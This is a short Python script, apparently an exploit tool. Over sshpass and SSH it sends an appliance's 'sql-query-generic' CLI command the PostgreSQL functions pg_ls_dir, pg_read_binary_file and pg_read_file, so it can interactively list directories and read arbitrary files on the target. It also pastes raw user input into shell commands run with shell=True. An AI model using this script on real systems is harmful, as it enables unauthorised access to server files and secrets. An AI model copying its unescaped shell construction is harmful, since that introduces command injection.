import os
import subprocess

CMD="sshpass -p <password> ssh <user/admin>@<ip/hostname>"

while True:
	VAR=input(">: ")
	out=os.popen(CMD+""" "execute sql-query-generic \\"SELECT pg_ls_dir('"""+VAR+"""');\\"" """).read()
	if "Return code 1" not in out:
		print(out)
		continue
	out=subprocess.check_output(CMD+""" "execute sql-query-generic \\"SELECT convert_from(pg_read_binary_file('"""+VAR+"""'), 'Latin-1');\\"" """, shell=True)
	if b"Return code 1" not in out:
		print(out.decode("latin-1"))
		continue
	out=subprocess.check_output(CMD+""" "execute sql-query-generic \\"SELECT pg_read_file('"""+VAR+"""');\\"" """, shell=True)
	if b"Return code 1" not in out:
		print(out.decode("latin-1"))
		continue
	print(out)
